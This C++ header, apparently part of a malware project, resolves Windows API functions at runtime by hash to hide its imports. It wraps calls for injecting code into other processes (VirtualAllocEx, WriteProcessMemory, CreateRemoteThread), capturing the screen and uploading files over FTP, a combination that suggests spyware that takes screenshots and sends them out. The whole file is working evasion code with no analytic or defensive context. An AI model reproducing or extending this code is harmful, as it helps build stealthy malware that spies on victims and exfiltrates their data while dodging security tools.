#include<iostream>
#include<Windows.h>
#include<wininet.h>
#include "API_Hash.h"
#include <gdiplus.h>
#include <time.h>
#pragma comment (lib, "Gdiplus.lib")

#define EnumWindows_Hash 4059655453
#define FindWindowA_Hash 1486750715
#define GetWindowThreadProcessId_Hash 180008592
#define OpenProcess_Hash 2915901297
#define VirtualAllocEx_Hash 2906580945
#define WriteProcessMemory_Hash 1629303675
#define CreateRemoteThread_Hash 2829816786
#define GetLocalTime_Hash 2117596301
#define InternetOpenW_Hash 727198548
#define InternetOpenA_Hash 846670021
#define InternetConnectW_Hash 3702420744
#define InternetConnectA_Hash 2812739267
#define InternetCloseHandle_Hash 4247665335
#define FtpPutFile_Hash 372011813
#define FtpPutFileA_Hash 2226496499
#define CreateCompatibleDC_Hash 3959925189
#define CreateCompatibleBitmap_Hash 300739479
#define SelectObject_Hash 813281012
#define BitBlt_Hash 2187948995
#define DeleteObject_Hash 3906846344
#define GdiplusShutdown_Hash 710618013
#define LoadLibraryA_Hash 3191677352
#define CloseHandle_Hash 2783669831
#define CreateFileA_Hash 2082231237
#define GetModuleFileNameA_Hash 1532712750
#define GetFileSize_Hash 3473336434
#define CreateFileMappingA_Hash 2054448714
#define MapViewOfFile_Hash 3104255590
#define UnmapViewOfFile_Hash 3202500368
#define GetModuleHandleA_Hash 3546078231
#define GetProcAddress_Hash 2465801035
#define VirtualProtect_Hash 4183147728
#define Sleep_Hash 3837173563


typedef VOID(CALLBACK* customGetSystemTime)(
	LPSYSTEMTIME lpSystemTime
	);

inline BOOL WINAPI pEnumWindows(
	WNDENUMPROC lpEnumFunc,
	LPARAM      lParam
) {
	BOOL(WINAPI * pFunction)(WNDENUMPROC, LPARAM);
	pFunction = (BOOL(WINAPI*)(WNDENUMPROC, LPARAM))getAPIAddr(user32, EnumWindows_Hash);
	return pFunction(lpEnumFunc, lParam);
}

inline HWND WINAPI pFindWindowA(
	LPCSTR lpClassName,
	LPCSTR lpWindowName
) {
	HWND(WINAPI * pFunction)(LPCSTR, LPCSTR);
	pFunction = (HWND(WINAPI*)(LPCSTR, LPCSTR))getAPIAddr(user32, FindWindowA_Hash);
	return pFunction(lpClassName, lpWindowName);
}

inline DWORD WINAPI pGetWindowProcessId(
	HWND    hWnd,
	LPDWORD lpdwProcessId
) {
	DWORD(WINAPI * pFunction)(HWND, LPDWORD);
	pFunction = (DWORD(WINAPI*)(HWND, LPDWORD))getAPIAddr(user32, GetWindowThreadProcessId_Hash);
	return pFunction(hWnd, lpdwProcessId);
}

inline HANDLE WINAPI pOpenProcess(
	DWORD dwDesiredAccess,
	BOOL  bInheritHandle,
	DWORD dwProcessId
) {
	HANDLE(WINAPI * pFunction)(DWORD, BOOL, DWORD);
	pFunction = (HANDLE(WINAPI*)(DWORD, BOOL, DWORD))getAPIAddr(kernel32, OpenProcess_Hash);
	return pFunction(dwDesiredAccess, bInheritHandle, dwProcessId);
}

inline LPVOID WINAPI pVirtualAllocEx(
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
) {
	LPVOID(WINAPI * pFunction)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
	pFunction = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))getAPIAddr(kernel32, VirtualAllocEx_Hash);
	return pFunction(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
}

inline BOOL pWriteProcessMemory(
	HANDLE  hProcess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesWritten
) {
	BOOL(WINAPI * pFunction)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
	pFunction = (BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))getAPIAddr(kernel32, WriteProcessMemory_Hash);
	return pFunction(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
}

inline HANDLE pCreateRemoteThread(
	HANDLE                 hProcess,
	LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	SIZE_T                 dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID                 lpParameter,
	DWORD                  dwCreationFlags,
	LPDWORD                lpThreadId
) {
	HANDLE(WINAPI * pFunction)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
	pFunction = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))getAPIAddr(kernel32, CreateRemoteThread_Hash);
	return pFunction(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
}

inline VOID pGetLocalTime(
	LPSYSTEMTIME lpSystemTime
) {
	VOID(WINAPI * pFunction)(LPSYSTEMTIME);
	pFunction = (VOID(WINAPI*)(LPSYSTEMTIME))getAPIAddr(kernel32, GetLocalTime_Hash);
	return pFunction(lpSystemTime);
}

inline HINTERNET pInternetOpenW(
	LPCWSTR lpszAgent,
	DWORD   dwAccessType,
	LPCWSTR lpszProxy,
	LPCWSTR lpszProxyBypass,
	DWORD   dwFlags
) {
	HINTERNET(WINAPI * pFunction)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
	pFunction = (HINTERNET(WINAPI*)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD))getAPIAddr(wininet, InternetOpenW_Hash);
	return pFunction(lpszAgent, dwAccessType, lpszProxy, lpszProxyBypass, dwFlags);
}

inline HINTERNET pInternetOpenA(
	LPCSTR lpszAgent,
	DWORD dwAccessType,
	LPCSTR lpszProxy,
	LPCSTR lpszProxyBypass,
	DWORD dwFlags
) {
	HINTERNET(WINAPI * pFunction)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
	pFunction = (HINTERNET(WINAPI*)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD))getAPIAddr(wininet, InternetOpenA_Hash);
	return pFunction(lpszAgent, dwAccessType, lpszProxy, lpszProxyBypass, dwFlags);
}

inline HINTERNET pInternetConnectW(
	HINTERNET     hInternet,
	LPCWSTR       lpszServerName,
	INTERNET_PORT nServerPort,
	LPCWSTR       lpszUserName,
	LPCWSTR       lpszPassword,
	DWORD         dwService,
	DWORD         dwFlags,
	DWORD_PTR     dwContext
) {
	HINTERNET(WINAPI * pFunction)(HINTERNET, LPCWSTR, INTERNET_PORT, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR);
	pFunction = (HINTERNET(WINAPI*)(HINTERNET, LPCWSTR, INTERNET_PORT, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR))getAPIAddr(wininet, InternetConnectW_Hash);
	return pFunction(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
}

inline HINTERNET pInternetConnectA(
	HINTERNET     hInternet,
	LPCSTR       lpszServerName,
	INTERNET_PORT nServerPort,
	LPCSTR       lpszUserName,
	LPCSTR       lpszPassword,
	DWORD         dwService,
	DWORD         dwFlags,
	DWORD_PTR     dwContext
) {
	HINTERNET(WINAPI * pFunction)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
	pFunction = (HINTERNET(WINAPI*)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR))getAPIAddr(wininet, InternetConnectA_Hash);
	return pFunction(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
}

inline BOOL pInternetCloseHandle(
	HINTERNET hInternet
) {
	BOOL(WINAPI * pFunction)(HINTERNET);
	pFunction = (BOOL(WINAPI*)(HINTERNET))getAPIAddr(wininet, InternetCloseHandle_Hash);
	return pFunction(hInternet);
}

inline BOOL pFtpPutFileW(
	HINTERNET hConnect,
	LPCWSTR   lpszLocalFile,
	LPCWSTR   lpszNewRemoteFile,
	DWORD     dwFlags,
	DWORD_PTR dwContext
) {
	BOOL(WINAPI * pFunction)(HINTERNET, LPCWSTR, LPCWSTR, DWORD, DWORD_PTR);
	pFunction = (BOOL(WINAPI*)(HINTERNET, LPCWSTR, LPCWSTR, DWORD, DWORD_PTR))getAPIAddr(wininet, FtpPutFile_Hash);
	return pFunction(hConnect, lpszLocalFile, lpszNewRemoteFile, dwFlags, dwContext);
}

inline BOOL pFtpPutFileA(
	HINTERNET hConnect,
	LPCSTR   lpszLocalFile,
	LPCSTR   lpszNewRemoteFile,
	DWORD     dwFlags,
	DWORD_PTR dwContext
) {
	BOOL(WINAPI * pFunction)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD_PTR);
	pFunction = (BOOL(WINAPI*)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD_PTR))getAPIAddr(wininet, FtpPutFileA_Hash);
	return pFunction(hConnect, lpszLocalFile, lpszNewRemoteFile, dwFlags, dwContext);
}


inline HDC pCreateCompatibleDC(
	HDC hdc
) {
	HDC(WINAPI * pFunction)(HDC);
	pFunction = (HDC(WINAPI*)(HDC))getAPIAddr(gdi32, CreateCompatibleDC_Hash);
	return pFunction(hdc);
}

inline HBITMAP pCreateCompatibleBitmap(
	HDC hdc,
	int cx,
	int cy
) {
	HBITMAP(WINAPI * pFunction)(HDC, int, int);
	pFunction = (HBITMAP(WINAPI*)(HDC, int, int))getAPIAddr(gdi32, CreateCompatibleBitmap_Hash);
	return pFunction(hdc, cx, cy);
}


inline HGDIOBJ pSelectObject(
	HDC hdc,
	HGDIOBJ h
) {
	HGDIOBJ(WINAPI * pFunction)(HDC, HGDIOBJ);
	pFunction = (HGDIOBJ(WINAPI*)(HDC, HGDIOBJ))getAPIAddr(gdi32, SelectObject_Hash);
	return pFunction(hdc, h);
}

inline BOOL pBitBlt(
	HDC hdc,
	int x,
	int y,
	int cx,
	int cy,
	HDC hdcSrc,
	int x1,
	int y1,
	DWORD rop
) {
	BOOL(WINAPI * pFunction)(HDC, int, int, int, int, HDC, int, int, DWORD);
	pFunction = (BOOL(WINAPI*)(HDC, int, int, int, int, HDC, int, int, DWORD))getAPIAddr(gdi32, BitBlt_Hash);
	return pFunction(hdc, x, y, cx, cy, hdcSrc, x1, y1, rop);
}

inline BOOL pDeleteObject(
	HGDIOBJ ho
) {
	BOOL(WINAPI * pFunction)(HGDIOBJ);
	pFunction = (BOOL(WINAPI*)(HGDIOBJ))getAPIAddr(gdi32, DeleteObject_Hash);
	return pFunction(ho);
}

inline void pGdiplusShutdown(
	ULONG_PTR token
) {
	void(WINAPI * pFunction)(ULONG_PTR);
	pFunction = (void(WINAPI*)(ULONG_PTR))getAPIAddr(gdi32, GdiplusShutdown_Hash);
	return pFunction(token);
}

inline HMODULE pLoadLibraryA(
	LPCSTR lpLibFileName
) {
	HMODULE(WINAPI * pFunction)(LPCSTR);
	pFunction = (HMODULE(WINAPI*)(LPCSTR))getAPIAddr(kernel32, LoadLibraryA_Hash);
	return pFunction(lpLibFileName);
}

inline BOOL pCloseHandle(
	HANDLE hObject
) {
	BOOL(WINAPI * pFunction)(HANDLE);
	pFunction = (BOOL(WINAPI*)(HANDLE))getAPIAddr(kernel32, CloseHandle_Hash);
	return pFunction(hObject);
}

inline HANDLE pCreateFileA(
	LPCSTR                lpFileName,
	DWORD                 dwDesiredAccress,
	DWORD				  dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD                 dwCreationDisposition,
	DWORD                 dwFlagsAndAttributes,
	HANDLE                hTemplateFile
) {
	HANDLE(WINAPI * pFunction)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
	pFunction = (HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))getAPIAddr(kernel32, CreateFileA_Hash);
	return pFunction(lpFileName, dwDesiredAccress, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

inline DWORD pGetModuleFileNameA(
	HMODULE hModule,
	LPSTR   lpFilename,
	DWORD   nSize
) {
	DWORD(WINAPI * pFunction)(HMODULE, LPSTR, DWORD);
	pFunction = (DWORD(WINAPI*)(HMODULE, LPSTR, DWORD))getAPIAddr(kernel32, GetModuleFileNameA_Hash);
	return pFunction(hModule, lpFilename, nSize);
}

inline DWORD pGetFileSize(
	HANDLE hFile,
	LPDWORD lpFileSizeHigh
) {
	DWORD(WINAPI * pFunction)(HANDLE, LPDWORD);
	pFunction = (DWORD(WINAPI*)(HANDLE, LPDWORD))getAPIAddr(kernel32, GetFileSize_Hash);
	return pFunction(hFile, lpFileSizeHigh);
}

inline HANDLE pCreateFileMappingA(
	HANDLE                hFile,
	LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
	DWORD                 flProtect,
	DWORD                 dwMaximumSizeHigh,
	DWORD                 dwMaximumSizeLow,
	LPCSTR                lpName
) {
	HANDLE(WINAPI * pFunction)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
	pFunction = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))getAPIAddr(kernel32, CreateFileMappingA_Hash);
	return pFunction(hFile, lpFileMappingAttributes, flProtect, dwMaximumSizeHigh, dwMaximumSizeLow, lpName);
}

inline LPVOID pMapViewOfFile(
	HANDLE hFileMappingObject,
	DWORD  dwDesiredAccess,
	DWORD  dwFileOffsetHigh,
	DWORD  dwFileOffsetLow,
	SIZE_T dwNumberOfBytesToMap
) {
	LPVOID(WINAPI * pFunction)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
	pFunction = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))getAPIAddr(kernel32, MapViewOfFile_Hash);
	return pFunction(hFileMappingObject, dwDesiredAccess, dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap);
}

inline BOOL pUnmapViewOfFile(
	LPCVOID lpBaseAddress
) {
	BOOL(WINAPI * pFunction)(LPCVOID);
	pFunction = (BOOL(WINAPI*)(LPCVOID))getAPIAddr(kernel32, UnmapViewOfFile_Hash);
	return pFunction(lpBaseAddress);
}

inline HMODULE pGetModuleHandleA(
	LPCSTR lpModuleName
) {
	HMODULE(WINAPI * pFunction)(LPCSTR);
	pFunction = (HMODULE(WINAPI*)(LPCSTR))getAPIAddr(kernel32, GetModuleHandleA_Hash);
	return pFunction(lpModuleName);
}

inline FARPROC pGetProcAddress(
	HMODULE hModule,
	LPCSTR lpProcName
) {
	FARPROC(WINAPI * pFunction)(HMODULE, LPCSTR);
	pFunction = (FARPROC(WINAPI*)(HMODULE, LPCSTR))getAPIAddr(kernel32, GetProcAddress_Hash);
	return pFunction(hModule, lpProcName);
}

inline BOOL pVirtualProtect(
	LPVOID	lpAddress,
	SIZE_T	dwSize,
	DWORD	flNewProtect,
	PDWORD	lpflOldProtect
) {
	BOOL(WINAPI * pFunction)(LPVOID, SIZE_T, DWORD, PDWORD);
	pFunction = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))getAPIAddr(kernel32, VirtualProtect_Hash);
	return pFunction(lpAddress, dwSize, flNewProtect, lpflOldProtect);
}

inline void pSleep(
	DWORD	dwMillisecond
) {
	void(WINAPI * pFunction)(DWORD);
	pFunction = (void(WINAPI*)(DWORD))getAPIAddr(kernel32, Sleep_Hash);
	return pFunction(dwMillisecond);
}

